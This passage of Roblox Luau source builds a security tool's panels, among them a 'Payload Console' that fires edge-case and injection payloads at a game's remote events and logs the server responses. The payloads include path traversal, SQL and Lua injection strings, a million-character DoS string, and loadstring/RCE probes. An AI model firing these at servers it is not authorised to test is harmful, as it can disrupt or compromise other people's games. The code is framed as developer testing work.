    mF(hdr, 0,0,2,HDR_H, headerCol, 0.0, 82)

    mL(hdr, 10, 3, RW-60, 15, "DEPENDENCY PATH TRACER",
        Enum.Font.GothamBold, 9, headerCol, Enum.TextXAlignment.Left, 82)

    local modeTxt = result.sourceMode
        and (result.scriptCount .. " scripts  |  " .. #result.remotes .. " remotes")
        or  ("Name inference  |  " .. result.scriptCount .. " scripts  |  "
             .. #result.remotes .. " remotes")
    mL(hdr, 10, 21, RW-60, 13, modeTxt,
        Enum.Font.Gotham, 8, GC.DIM, Enum.TextXAlignment.Left, 82)

    -- Mode badge
    local badgeCol = result.sourceMode and GC.CHK or GC.WARN
    local badge = mF(hdr, RW-52, (HDR_H-14)/2, 44, 14, badgeCol, 0.68, 82)
    mC(badge, 4)
    mL(badge,0,0,44,14,
        result.sourceMode and "SOURCE" or "INFER",
        Enum.Font.GothamBold, 7, GC.PRI, Enum.TextXAlignment.Center, 83)

    -- Close button
    local cb = mBtn(hdr, RW-18, 5, 14, 14, GC.ERR, 0.22, 82)
    mC(cb, 3)
    mL(cb,0,0,14,14,"x",Enum.Font.GothamBold,9,GC.PRI,
        Enum.TextXAlignment.Center, 83)
    cb.MouseButton1Click:Connect(function()
        if traceReportFrame then traceReportFrame:Destroy() traceReportFrame=nil end
    end)

    -- -- Drag logic on the header ----------------------------------
    local dragActive = false
    local dragSX, dragSY, dragFX, dragFY = 0,0,0,0
    hdr.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dragActive = true
            dragSX = inp.Position.X
            dragSY = inp.Position.Y
            dragFX = rf.Position.X.Offset
            dragFY = rf.Position.Y.Offset
        end
    end)
    hdr.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dragActive = false
        end
    end)
    local moveConn = UserInputService.InputChanged:Connect(function(inp)
        if not dragActive then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
        rf.Position = UDim2.fromOffset(
            dragFX + inp.Position.X - dragSX,
            dragFY + inp.Position.Y - dragSY)
    end)
    -- Disconnect when panel is destroyed
    rf.AncestryChanged:Connect(function()
        if not rf.Parent then moveConn:Disconnect() end
    end)

    -- -- Separator ------------------------------------------------
    mF(rf, 0, HDR_H, RW, 1, headerCol, 0.60, 81).Size = UDim2.new(1,0,0,1)

    -- -- Connection rows (clickable) -------------------------------
    -- Clicking a row scrolls the canvas to that node and selects it.
    local function scrollToNode(node)
        if not node or not graphCanvas then return end
        local nx = node.frame.Position.X.Offset
        local ny = node.frame.Position.Y.Offset
        local cw = graphCanvas.AbsoluteSize.X
        local ch = graphCanvas.AbsoluteSize.Y
        graphCanvas.CanvasPosition = Vector2.new(
            math.max(0, nx - cw/2 + NODE_W/2),
            math.max(0, ny - ch/2 + NODE_H/2))
        selectNode(node)
    end

    if #topConns == 0 then
        mL(rf, 10, HDR_H+4, RW-16, ROW_H,
            "No connections discovered.",
            Enum.Font.Gotham, 9, GC.DIM, Enum.TextXAlignment.Left, 82)
    else
        for i, c in ipairs(topConns) do
            local ry  = HDR_H + 1 + (i-1) * ROW_H
            local col, _ = confidenceColour(c.confidence)
            local pct    = math.floor(c.confidence * 100)

            -- Row hit area (makes the whole row clickable)
            local row = mBtn(rf, 0, ry, RW, ROW_H, GC.CTX_ROW, 0.72, 81)
            row.Size = UDim2.new(1,0,0,ROW_H)

            -- Confidence bar (background track + fill)
            local barW = math.floor((RW-20) * c.confidence)
            mF(rf, 10, ry+ROW_H-3, RW-20, 2, GC.DIV, 0.75, 81)
            mF(rf, 10, ry+ROW_H-3, barW,  2, col,    0.35, 82)

            -- Left accent stripe (confidence colour)
            mF(row, 0, 0, 2, ROW_H, col, 0.0, 83)

            -- Remote name
            mL(row, 8, 2, 145, 14, c.remoteName,
                Enum.Font.GothamBold, 9, col,
                Enum.TextXAlignment.Left, 83)

            -- Script name + confidence %
            mL(row, 0, 2, RW-8, 14,
                c.scriptName .. "  " .. pct .. "%",
                Enum.Font.Gotham, 8, GC.DIM,
                Enum.TextXAlignment.Right, 83)

            -- Evidence tag
            mL(row, 8, 14, RW-16, 11,
                c.evidence:sub(1,36),
                Enum.Font.Gotham, 7, GC.DIM,
                Enum.TextXAlignment.Left, 83)

            -- Hover
            row.MouseEnter:Connect(function()
                TweenService:Create(row, TweenInfo.new(0.08),
                    {BackgroundColor3=GC.CTX_HOT, BackgroundTransparency=0.40}):Play()
            end)
            row.MouseLeave:Connect(function()
                TweenService:Create(row, TweenInfo.new(0.08),
                    {BackgroundColor3=GC.CTX_ROW, BackgroundTransparency=0.72}):Play()
            end)

            -- Click: find the best matching placed node and navigate to it
            local capturedConn = c
            row.MouseButton1Click:Connect(function()
                -- Determine which stage this connection's remote belongs to
                local targetStage = "REMOTE"
                if capturedConn.remoteCls == "BindableEvent"
                or capturedConn.remoteCls == "BindableFunction" then
                    targetStage = "BINDABLE"
                end

                local targetNode = traceLastPlaced[targetStage]
                if targetNode then
                    scrollToNode(targetNode)

                    -- Also apply this specific connection to the node
                    targetNode.targetInst     = capturedConn.remoteInst
                    targetNode.selectedAction = {
                        n    = capturedConn.remoteName,
                        d    = capturedConn.remoteCls .. " @ " .. capturedConn.remotePath,
                        inst = capturedConn.remoteInst,
                        cls  = capturedConn.remoteCls,
                        path = capturedConn.remotePath,
                    }
                    if targetNode.actionLbl then
                        targetNode.actionLbl.Text       = capturedConn.remoteName
                        targetNode.actionLbl.TextColor3 = GC.MID
                    end
                    refreshWires()
                end
            end)
        end
    end

    -- -- Footer ---------------------------------------------------
    local footY = HDR_H + 1 + math.max(#topConns,1) * ROW_H
    mF(rf, 0, footY, RW, 1, headerCol, 0.65, 81).Size = UDim2.new(1,0,0,1)

    local stageList = {}
    for id, _ in pairs(result.stagePresent) do
        table.insert(stageList, id)
    end
    local sumTxt = #stageList > 0
        and ("Evidenced: " .. table.concat(stageList, " -> "))
        or  "No stage evidence found."
    mL(rf, 8, footY+2, RW-16, FOOT_H-2, sumTxt,
        Enum.Font.Gotham, 8, GC.DIM, Enum.TextXAlignment.Left, 82)
end

-- Scan progress overlay on the canvas
local scanOverlay = nil
local function showScanOverlay(msg)
    if scanOverlay then
        local lbl = scanOverlay:FindFirstChild("Msg")
        if lbl then lbl.Text = msg end
        return
    end
    if not graphCanvas then return end
    local ow = 200
    local oc = mF(graphCanvas,
        graphCanvas.CanvasPosition.X + graphCanvas.AbsoluteSize.X/2 - ow/2,
        graphCanvas.CanvasPosition.Y + graphCanvas.AbsoluteSize.Y/2 - 16,
        ow, 32, GC.CTX_BOT, 0.20, 60)
    mC(oc, 6)
    mS(oc, GC.WARN, 0.30, 1)
    local lbl = mL(oc, 0,0,ow,32, msg, Enum.Font.GothamBold, 10,
        GC.WARN, Enum.TextXAlignment.Center, 61)
    lbl.Name = "Msg"
    scanOverlay = oc
end
local function hideScanOverlay()
    if scanOverlay then scanOverlay:Destroy() scanOverlay=nil end
end



-- --- RISK DETAIL PANEL --------------------------------------------------------
-- Floats above the canvas (parented to ScreenGui).
-- Opens when the user clicks the risk badge in the toolbar.
-- Closes when the close button is pressed or when the badge is clicked again.

local function closeRiskDetail()
    if riskDetailFrm then riskDetailFrm:Destroy() riskDetailFrm=nil end
end

local function showRiskDetail()
    closeRiskDetail()

    local r = scoreChain()
    if r.tier == "NONE" then return end

    -- Layout
    local DW     = 290
    local HDR_H  = 42
    local ROW_H  = 30   -- each reason row height
    local FOOT_H = 22
    local SEP    = 1
    -- Cap displayed reasons at 8
    local showReasons = {}
    for i, rs in ipairs(r.reasons) do
        if rs.severity ~= "INFO" and rs.weight ~= 0 then
            table.insert(showReasons, rs)
        end
        if #showReasons >= 8 then break end
    end
    local DH = HDR_H + SEP + #showReasons * ROW_H + SEP + FOOT_H

    -- Position near the toolbar risk badge area
    local initX = graphCanvas and (graphCanvas.AbsolutePosition.X + graphCanvas.AbsoluteSize.X - DW - 14)
                               or  600
    local initY = graphCanvas and (graphCanvas.AbsolutePosition.Y + 10)
                               or  100

    local df = mF(ScreenGui, initX, initY, DW, DH, r.tierBg, 0.18, 85)
    mC(df, 7)
    mGrad(df, r.tierBg, Color3.fromRGB(10,12,20), 90)
    mS(df, r.tierCol, 0.22, 1)
    mGlow(df, r.tierCol, 0.55, 3)
    riskDetailFrm = df

    -- -- Header -----------------------------------------------------
    local hdr = mF(df, 0, 0, DW, HDR_H, Color3.fromRGB(8,9,16), 0.25, 86)
    hdr.Size = UDim2.new(1,0,0,HDR_H)
    mC(hdr, 7)
    mGrad(hdr, r.tierBg, Color3.fromRGB(8,9,16), 90)
    mF(hdr,0,HDR_H-6,DW,6,Color3.fromRGB(8,9,16),0.25,86).Size=UDim2.new(1,0,0,6)

    -- Tier accent stripe
    mF(hdr, 0, 0, 3, HDR_H, r.tierCol, 0.0, 87)

    -- Score circle / badge
    local CIRC = 32
    local circ = mF(hdr, 10, (HDR_H-CIRC)/2, CIRC, CIRC, r.tierCol, 0.72, 87)
    mC(circ, CIRC/2)
    mS(circ, r.tierCol, 0.30, 1)
    mL(circ, 0,0,CIRC,CIRC,
        tostring(r.score),
        Enum.Font.GothamBold, 12, Color3.fromRGB(255,255,255),
        Enum.TextXAlignment.Center, 88)

    -- Title + tier
    mL(hdr, CIRC+18, 5, DW-CIRC-48, 16,
        "DATA-FLOW RISK SCORE",
        Enum.Font.GothamBold, 9, r.tierCol,
        Enum.TextXAlignment.Left, 87)
    mL(hdr, CIRC+18, 22, DW-CIRC-48, 14,
        r.tier .. " RISK  --  " .. r.score .. " / 100",
        Enum.Font.GothamBold, 10, r.tierCol,
        Enum.TextXAlignment.Left, 87)

    -- Close
    local cb = mBtn(hdr, DW-20, 7, 14, 14, GC.ERR, 0.24, 87)
    mC(cb, 3)
    mL(cb,0,0,14,14,"x",Enum.Font.GothamBold,9,GC.PRI,Enum.TextXAlignment.Center,88)
    cb.MouseButton1Click:Connect(closeRiskDetail)

    -- Header drag
    local dActive,dSX,dSY,dFX,dFY = false,0,0,0,0
    hdr.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dActive=true dSX=inp.Position.X dSY=inp.Position.Y
            dFX=df.Position.X.Offset dFY=df.Position.Y.Offset
        end
    end)
    hdr.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then dActive=false end
    end)
    local mc = UserInputService.InputChanged:Connect(function(inp)
        if not dActive then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
        df.Position = UDim2.fromOffset(
            dFX + inp.Position.X - dSX,
            dFY + inp.Position.Y - dSY)
    end)
    df.AncestryChanged:Connect(function()
        if not df.Parent then mc:Disconnect() end
    end)

    -- -- Separator -------------------------------------------------
    mF(df, 0, HDR_H, DW, SEP, r.tierCol, 0.60, 86).Size = UDim2.new(1,0,0,1)

    -- -- Reason rows -----------------------------------------------
    local SEV_COL = {
        CRITICAL = GC.ERR,
        HIGH     = Color3.fromRGB(230, 110, 70),
        MEDIUM   = GC.WARN,
        LOW      = GC.CHK,
        INFO     = GC.DIM,
    }
    local SEV_ICON = {
        CRITICAL = "[!!]",
        HIGH     = "[!] ",
        MEDIUM   = "[~] ",
        LOW      = "[+] ",
        INFO     = "[i] ",
    }

    for i, rs in ipairs(showReasons) do
        local ry  = HDR_H + SEP + (i-1) * ROW_H
        local col = SEV_COL[rs.severity] or GC.DIM
        local ico = SEV_ICON[rs.severity] or "[ ] "

        local row = mF(df, 0, ry, DW, ROW_H,
            rs.weight > 0 and Color3.fromRGB(30,10,10) or Color3.fromRGB(8,22,12),
            0.70, 86)
        row.Size = UDim2.new(1,0,0,ROW_H)

        -- Left severity stripe
        mF(row, 0, 0, 2, ROW_H, col, 0.0, 87)

        -- Weight pill (right side)
        local wStr = (rs.weight > 0 and "+" or "") .. tostring(rs.weight)
        local wBadge = mF(row, DW-32, (ROW_H-13)/2, 28, 13, col, 0.72, 87)
        mC(wBadge, 4)
        mL(wBadge, 0,0,28,13, wStr,
            Enum.Font.GothamBold, 8, GC.PRI,
            Enum.TextXAlignment.Center, 88)

        -- Icon + reason text (wraps to 2 lines)
        mL(row, 8, 0, 22, ROW_H, ico,
            Enum.Font.GothamBold, 8, col,
            Enum.TextXAlignment.Left, 87)
        local tl = Instance.new("TextLabel")
        tl.Size                = UDim2.fromOffset(DW-50, ROW_H)
        tl.Position            = UDim2.fromOffset(28, 0)
        tl.BackgroundTransparency = 1
        tl.Text                = rs.text
        tl.Font                = Enum.Font.Gotham
        tl.TextSize            = 8
        tl.TextColor3          = GC.MID
        tl.TextXAlignment      = Enum.TextXAlignment.Left
        tl.TextYAlignment      = Enum.TextYAlignment.Center
        tl.TextWrapped         = true
        tl.ZIndex              = 87
        tl.Parent              = row

        -- Thin separator line between rows
        if i < #showReasons then
            mF(df, 4, ry+ROW_H-1, DW-8, 1, GC.DIV, 0.75, 86)
        end
    end

    -- -- Footer: summary recommendation ----------------------------
    local footY = HDR_H + SEP + #showReasons * ROW_H + SEP
    mF(df, 0, footY-1, DW, 1, r.tierCol, 0.65, 86).Size=UDim2.new(1,0,0,1)
    local rec = r.tier == "HIGH"
        and "Enforce validation at the RemoteEvent boundary to sever the chain."
        or  r.tier == "MEDIUM"
        and "Amplification risk. Secure MessagingService access or add provenance tags."
        or  "Risk mitigated. Verify controls are enforced at runtime, not just in config."
    local recLbl = Instance.new("TextLabel")
    recLbl.Size                = UDim2.fromOffset(DW-12, FOOT_H)
    recLbl.Position            = UDim2.fromOffset(6, footY+1)
    recLbl.BackgroundTransparency = 1
    recLbl.Text                = rec
    recLbl.Font                = Enum.Font.Gotham
    recLbl.TextSize            = 8
    recLbl.TextColor3          = r.tierCol
    recLbl.TextXAlignment      = Enum.TextXAlignment.Left
    recLbl.TextYAlignment      = Enum.TextYAlignment.Center
    recLbl.TextWrapped         = true
    recLbl.ZIndex              = 86
    recLbl.Parent              = df
end

-- --- PAYLOAD CONSOLE ----------------------------------------------------------
-- Interactive testing workbench. Lets developers draft or generate edge-case
-- payloads and fire them through the configured chain, observing real server
-- responses in a live output log.
--
-- Payload generators store actual Lua values internally (no loadstring needed).
-- Custom text input sends the user's string as the payload literal.

-- Module state
local consoleFrm      = nil   -- the floating panel frame
local consoleLogScroll= nil   -- the output ScrollingFrame
local consoleLogLines = {}    -- array of TextLabel references (capped at MAX_LOG)
local consolePayload  = nil   -- currently selected payload value
local consolePayloadTxt = ""  -- human-readable representation of current payload
local consoleBusy     = false -- prevents overlapping fire calls
local MAX_LOG_LINES   = 60

-- -- Payload generator catalogue -----------------------------------------------
-- Each entry: { label (button text), desc (tooltip line), fn (returns value) }
local GENERATORS = {
    { label="nil",     desc="Null / nil value",
      fn=function() return nil end },
    { label="{}",      desc="Empty table",
      fn=function() return {} end },
    { label="false",   desc="Boolean false",
      fn=function() return false end },
    { label="true",    desc="Boolean true",
      fn=function() return true end },
    { label="0",       desc="Zero (integer)",
      fn=function() return 0 end },
    { label="inf",       desc="math.huge -- float overflow / division by zero",
      fn=function() return math.huge end },
    { label="2^53",    desc="Maximum safe integer (IEEE 754 precision limit)",
      fn=function() return 2^53 end },
    { label="-2^53",   desc="Minimum safe integer",
      fn=function() return -(2^53) end },
    { label='""',      desc="Empty string",
      fn=function() return "" end },
    { label="10k str", desc="10,000 character string (bandwidth / alloc stress)",
      fn=function() return string.rep("A", 10000) end },
    { label="1M str",  desc="1,000,000 character string (potential DoS)",
      fn=function() return string.rep("X", 1000000) end },
    { label="\\0",     desc="Null bytes embedded in string (parser confusion)",
      fn=function() return "\0\0\0\0" end },
    { label="nested",  desc="Deeply nested table {a={b={c={d={e=1}}}}}",
      fn=function() return {a={b={c={d={e=1}}}}} end },
    { label="mixed",   desc="Mixed-type array {1, 'x', true, nil}",
      fn=function() return {1, "x", true} end },
    { label="x100",    desc="Table with 100 sequential integer keys",
      fn=function()
          local t = {}
          for i = 1, 100 do t[i] = i end
          return t
      end },
    { label="../..",   desc="Path traversal string",
      fn=function() return "../../../etc/passwd" end },
    { label="SQL",     desc="SQL injection: ' OR 1=1--; DROP TABLE users;",
      fn=function() return "' OR 1=1--; DROP TABLE users;" end },
    { label="Lua",     desc="Lua injection attempt: '; require(0)--",
      fn=function() return "'; require(0)--" end },

    -- -- RCE VERIFICATION payloads ------------------------------------------
    -- These do not inject exploits -- they PROVE whether an execution sink exists.

    { label="RCE VERIFY", desc="Deterministic reflection test: send 59483+20394, "
                             .. "check if server returns 79877. Only an execution "
                             .. "sink (loadstring / custom interpreter) can produce "
                             .. "this result. A hardcoded script cannot.",
      fn=function()
          -- The server must evaluate this expression dynamically to return 79877.
          -- Send as multiple formats to maximise coverage across interpreter types.
          return { expr="59483+20394", eval=true, code="return 59483+20394" }
      end },

    { label="LOADSTRING", desc="Probe for loadstring() availability. Sends a string "
                             .. "that evaluates to a known value if the server passes "
                             .. "it to loadstring(). Safe -- no side effects if the "
                             .. "endpoint does not have an execution sink.",
      fn=function()
          -- If the server does: local f=loadstring(payload); return f()
          -- it will return 79877. Any other return confirms no loadstring path.
          return "return 59483+20394"
      end },

    { label="SCOPE PROBE", desc="Tests whether a custom interpreter leaks access to "
                             .. "server globals. Sends a string that reads _G or "
                             .. "game:GetService(). If the server returns service data, "
                             .. "the interpreter has no environment sandbox.",
      fn=function()
          return { code="return tostring(game.PlaceId)", probe="scope" }
      end },
}

-- -- Helpers -------------------------------------------------------------------
local function consoleTimestamp()
    return os.date("%H:%M:%S")
end

-- Render a value as a compact human-readable string for the log / payload box
local function valueRepr(v)
    local t = type(v)
    if v == nil   then return "nil" end
    if t == "boolean" then return tostring(v) end
    if t == "number"  then
        if v == math.huge  then return "math.huge"  end
        if v == -math.huge then return "-math.huge" end
        return tostring(v)
    end
    if t == "string" then
        if #v > 40 then
            return '"' .. v:sub(1,37):gsub("\0","\\0") .. '..." (' .. #v .. ' chars)'
        end
        return '"' .. v:gsub("\0","\\0") .. '"'
    end
    if t == "table" then
        local keys = 0
        for _ in pairs(v) do keys = keys + 1 end
        return "table{" .. keys .. " keys}"
    end
    return tostring(v)
end

-- Append a line to the output log
local function appendLog(text, col)
    if not consoleLogScroll then return end
    col = col or GC.MID

    local LINE_H = 14
    local lbl = Instance.new("TextLabel")
    lbl.Size                = UDim2.new(1,-8,0,LINE_H)
    lbl.BackgroundTransparency = 1
    lbl.Text                = text
    lbl.Font                = Enum.Font.Code
    lbl.TextSize            = 9
    lbl.TextColor3          = col
    lbl.TextXAlignment      = Enum.TextXAlignment.Left
    lbl.TextYAlignment      = Enum.TextYAlignment.Center
    lbl.TextTruncate        = Enum.TextTruncate.AtEnd
    lbl.ZIndex              = 92
    lbl.Parent              = consoleLogScroll

    table.insert(consoleLogLines, lbl)

    -- Reposition all lines top-to-bottom
    for i, l in ipairs(consoleLogLines) do
        l.Position = UDim2.fromOffset(4, (i-1) * LINE_H)
    end

    -- Cap at MAX_LOG_LINES
    if #consoleLogLines > MAX_LOG_LINES then
        consoleLogLines[1]:Destroy()
        table.remove(consoleLogLines, 1)
        for i, l in ipairs(consoleLogLines) do
            l.Position = UDim2.fromOffset(4, (i-1) * LINE_H)
        end
    end

    -- Scroll to bottom
    local totalH = #consoleLogLines * LINE_H
    consoleLogScroll.CanvasSize = UDim2.fromOffset(0, totalH)
    consoleLogScroll.CanvasPosition = Vector2.new(0,
        math.max(0, totalH - consoleLogScroll.AbsoluteSize.Y))
end

-- Find the best-configured Remote node in the current graph
local function resolveTarget()
    -- Check for a configured REMOTE node (S->S) or INGRESS node (HPDC) with a live instance
    local ENTRY_IDS = { REMOTE=true, INGRESS=true }
    for _, node in ipairs(graphNodes) do
        if ENTRY_IDS[node.typeData.id] and node.targetInst then
            local ok, valid = pcall(function()
                return node.targetInst.Parent ~= nil
            end)
            if ok and valid then
                return node, node.targetInst
            end
        end
    end
    -- Fallback: first entry node without a configured instance
    for _, node in ipairs(graphNodes) do
        if ENTRY_IDS[node.typeData.id] then return node, nil end
    end
    return nil, nil
end

-- Fire the current payload through the resolved target
local function firePayload(iterations, payloadTxtBox, targetLbl)
    if consoleBusy then
        appendLog("[!] Already firing -- wait for current run to finish.", GC.WARN)
        return
    end
    consoleBusy = true

    local node, inst = resolveTarget()

    -- Update target label
    if targetLbl then
        targetLbl.Text = inst and inst.Name or "none"
    end

    if not node then
        appendLog("[!] No Remote node found in graph. Add and configure one first.", GC.ERR)
        consoleBusy = false
        return
    end
    if not inst then
        appendLog("[!] Remote node has no instance selected. Right-click it to configure.", GC.WARN)
        consoleBusy = false
        return
    end

    -- Resolve payload
    local payload = consolePayload
    -- If the user typed a custom string, use that instead
    if payloadTxtBox then
        local txt = payloadTxtBox.Text
        if txt ~= consolePayloadTxt and txt ~= "" then
            payload = txt  -- send as raw string
        end
    end

    appendLog(string.format("[%s] --- Fire x%d  ->  %s  payload: %s",
        consoleTimestamp(), iterations, inst.Name, valueRepr(payload)), GC.DIM)

    task.spawn(function()
        for i = 1, iterations do
            local ts = consoleTimestamp()
            appendLog(string.format("[%s] -> [%d/%d]  %s",
                ts, i, iterations, valueRepr(payload)), GC.PRI)

            local ok, result = pcall(function()
                if inst.ClassName == "RemoteEvent" then
                    inst:FireServer(payload)
                    return "RemoteEvent fired (no return)"
                elseif inst.ClassName == "RemoteFunction" then
                    return inst:InvokeServer(payload)
                else
                    return nil, "Unknown remote class: " .. inst.ClassName
                end
            end)

            if ok then
                local res = valueRepr(result)
                appendLog(string.format("[%s] <-  %s", ts, res), GC.CHK)
            else
                appendLog(string.format("[%s] [X]  %s", ts,
                    tostring(result):sub(1,80)), GC.ERR)
            end

            if i < iterations then task.wait(0.08) end
        end

        appendLog(string.format("[%s] --- Run complete (%d iteration%s)",
            consoleTimestamp(), iterations,
            iterations > 1 and "s" or ""), GC.DIM)
        consoleBusy = false
    end)
end

-- -- Panel open/close ----------------------------------------------------------
local function closePayloadConsole()
    if consoleFrm then consoleFrm:Destroy() consoleFrm=nil end
    consoleLogScroll = nil
    consoleLogLines  = {}
end

local function showPayloadConsole()
    if consoleFrm then closePayloadConsole() return end

    local PW       = 330
    local HDR_H    = 36
    local GEN_ROWS = 3
    local GEN_H    = GEN_ROWS * 24   -- generator grid
    local PB_H     = 36              -- payload box
    local ITER_H   = 26              -- iteration row
    local LOG_H    = 160             -- output log
    local SEP      = 1
    local PH = HDR_H + SEP + GEN_H + SEP + PB_H + SEP + ITER_H + SEP + LOG_H

    -- Position: left side of canvas
    local initX = graphCanvas and (graphCanvas.AbsolutePosition.X + 10) or 60
    local initY = graphCanvas and (graphCanvas.AbsolutePosition.Y + 10) or 100

    local pf = mF(ScreenGui, initX, initY, PW, PH,
        Color3.fromRGB(10,12,20), 0.18, 88)
    mC(pf, 7)
    mGrad(pf, Color3.fromRGB(18,20,34), Color3.fromRGB(8,9,16), 90)
    mS(pf, Color3.fromRGB(110,155,245), 0.30, 1)
    mGlow(pf, Color3.fromRGB(110,155,245), 0.65, 3)
    consoleFrm = pf

    local curY = 0

    -- -- Header ----------------------------------------------------
    local hdr = mF(pf, 0, 0, PW, HDR_H, Color3.fromRGB(14,16,26), 0.22, 89)
    hdr.Size = UDim2.new(1,0,0,HDR_H)
    mC(hdr,7)
    mGrad(hdr, Color3.fromRGB(18,22,38), Color3.fromRGB(10,12,22), 90)
    mF(hdr,0,HDR_H-6,PW,6,Color3.fromRGB(10,12,22),0.22,89).Size=UDim2.new(1,0,0,6)
    mF(hdr, 0,0,3,HDR_H, Color3.fromRGB(110,155,245), 0.0, 90)
    mL(hdr, 10, 3, 140, 14, "PAYLOAD CONSOLE",
        Enum.Font.GothamBold, 9, Color3.fromRGB(110,155,245),
        Enum.TextXAlignment.Left, 90)

    -- Target indicator
    local node, inst = resolveTarget()
    local targetLbl = mL(hdr, PW-170, 3, 158, 12,
        "TARGET: " .. (inst and inst.Name or "none configured"),
        Enum.Font.Gotham, 8, GC.DIM, Enum.TextXAlignment.Right, 90)

    -- Subtitle
    mL(hdr, 10, 20, PW-80, 12,
        "Edge-case payload generator & live response log",
        Enum.Font.Gotham, 8, GC.DIM, Enum.TextXAlignment.Left, 90)

    -- Close
    local cb = mBtn(hdr, PW-20, 8, 14, 14, GC.ERR, 0.22, 90)
    mC(cb,3)
    mL(cb,0,0,14,14,"x",Enum.Font.GothamBold,9,GC.PRI,Enum.TextXAlignment.Center,91)
    cb.MouseButton1Click:Connect(closePayloadConsole)

    -- Header drag
    local dActive,dSX,dSY,dFX,dFY=false,0,0,0,0
    hdr.InputBegan:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 then
            dActive=true dSX=inp.Position.X dSY=inp.Position.Y
            dFX=pf.Position.X.Offset dFY=pf.Position.Y.Offset
        end
    end)
    hdr.InputEnded:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 then dActive=false end
    end)
    local mc=UserInputService.InputChanged:Connect(function(inp)
        if not dActive then return end
        if inp.UserInputType~=Enum.UserInputType.MouseMovement then return end
        pf.Position=UDim2.fromOffset(
            dFX+inp.Position.X-dSX, dFY+inp.Position.Y-dSY)
    end)
    pf.AncestryChanged:Connect(function()
        if not pf.Parent then mc:Disconnect() end
    end)

    curY = curY + HDR_H + SEP

    -- -- Generator grid --------------------------------------------
    mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.50,89).Size=UDim2.new(1,0,0,1)

    -- Section label
    mL(pf, 8, curY+2, 80, 10, "GENERATORS",
        Enum.Font.GothamBold, 7, GC.DIM, Enum.TextXAlignment.Left, 90)

    -- We'll track which button is "active" for highlight
    local activeBtnFrm  = nil   -- the currently lit generator button bg
    local payloadTxtBox = nil   -- forward-declared, assigned below

    local COLS   = 6
    local BTN_W  = math.floor((PW - 12) / COLS)
    local BTN_H  = 20
    local BTN_GAP= 2
    local GEN_START_Y = curY + 13

    -- Store selected generator highlight references
    local genBtns = {}

    for i, gen in ipairs(GENERATORS) do
        local col   = math.floor((i-1) % COLS)
        local row   = math.floor((i-1) / COLS)
        local bx    = 6 + col * (BTN_W + BTN_GAP)
        local by    = GEN_START_Y + row * (BTN_H + BTN_GAP)

        local bg = mF(pf, bx, by, BTN_W, BTN_H,
            Color3.fromRGB(20,24,42), 0.45, 89)
        mC(bg, 4)
        mS(bg, GC.DIV, 0.60, 1)

        local lbl2 = mL(bg, 0,0,BTN_W,BTN_H, gen.label,
            Enum.Font.GothamBold, 8, GC.MID,
            Enum.TextXAlignment.Center, 90)

        local clickZ = mBtn(bg,0,0,BTN_W,BTN_H,Color3.new(0,0,0),1,91)

        clickZ.MouseEnter:Connect(function()
            TweenService:Create(bg,TweenInfo.new(0.08),{
                BackgroundColor3=Color3.fromRGB(30,36,65),
                BackgroundTransparency=0.25}):Play()
        end)
        clickZ.MouseLeave:Connect(function()
            if activeBtnFrm ~= bg then
                TweenService:Create(bg,TweenInfo.new(0.08),{
                    BackgroundColor3=Color3.fromRGB(20,24,42),
                    BackgroundTransparency=0.45}):Play()
            end
        end)

        local capturedGen = gen
        local capturedBg  = bg
        local capturedLbl = lbl2
        clickZ.MouseButton1Click:Connect(function()
            -- Deactivate previous
            if activeBtnFrm and activeBtnFrm ~= capturedBg then
                TweenService:Create(activeBtnFrm,TweenInfo.new(0.10),{
                    BackgroundColor3=Color3.fromRGB(20,24,42),
                    BackgroundTransparency=0.45}):Play()
                local prevLbl = activeBtnFrm:FindFirstChildOfClass("TextLabel")
                if prevLbl then prevLbl.TextColor3 = GC.MID end
            end
            -- Activate this button
            activeBtnFrm = capturedBg
            TweenService:Create(capturedBg,TweenInfo.new(0.10),{
                BackgroundColor3=Color3.fromRGB(110,155,245),
                BackgroundTransparency=0.72}):Play()
            capturedLbl.TextColor3 = GC.PRI

            -- Store payload
            consolePayload    = capturedGen.fn()
            consolePayloadTxt = valueRepr(consolePayload)

            -- Update payload text box
            if payloadTxtBox then
                payloadTxtBox.Text = consolePayloadTxt
            end
        end)

        table.insert(genBtns, {bg=bg, lbl=lbl2})
    end

    curY = curY + 13 + GEN_H + SEP

    -- -- Payload editor --------------------------------------------
    mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.55,89).Size=UDim2.new(1,0,0,1)
    mL(pf, 8, curY+2, 60, 10, "PAYLOAD",
        Enum.Font.GothamBold, 7, GC.DIM, Enum.TextXAlignment.Left, 90)

    payloadTxtBox = Instance.new("TextBox")
    payloadTxtBox.Size                  = UDim2.fromOffset(PW-16, PB_H-14)
    payloadTxtBox.Position              = UDim2.fromOffset(8, curY+13)
    payloadTxtBox.BackgroundColor3      = Color3.fromRGB(8, 10, 18)
    payloadTxtBox.BackgroundTransparency= 0.25
    payloadTxtBox.Text                  = "<- select a generator or type a custom string"
    payloadTxtBox.PlaceholderText       = "custom payload..."
    payloadTxtBox.PlaceholderColor3     = GC.DIM
    payloadTxtBox.TextColor3            = GC.PRI
    payloadTxtBox.Font                  = Enum.Font.Code
    payloadTxtBox.TextSize              = 9
    payloadTxtBox.ClearTextOnFocus      = false
    payloadTxtBox.TextXAlignment        = Enum.TextXAlignment.Left
    payloadTxtBox.MultiLine             = false
    payloadTxtBox.ZIndex                = 90
    payloadTxtBox.Parent                = pf
    mC(payloadTxtBox, 4)
    mS(payloadTxtBox, Color3.fromRGB(110,155,245), 0.60, 1)

    -- Clicking the box clears the "hint" text
    payloadTxtBox.Focused:Connect(function()
        if payloadTxtBox.Text:sub(1,1) == "<-" then
            payloadTxtBox.Text = ""
        end
    end)

    curY = curY + PB_H + SEP

    -- -- Iteration selector + FIRE --------------------------------
    mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.55,89).Size=UDim2.new(1,0,0,1)

    local ITERS  = {1, 5, 10, 50}
    local selIter = 1
    local iterBtns = {}
    local IB_W = 28

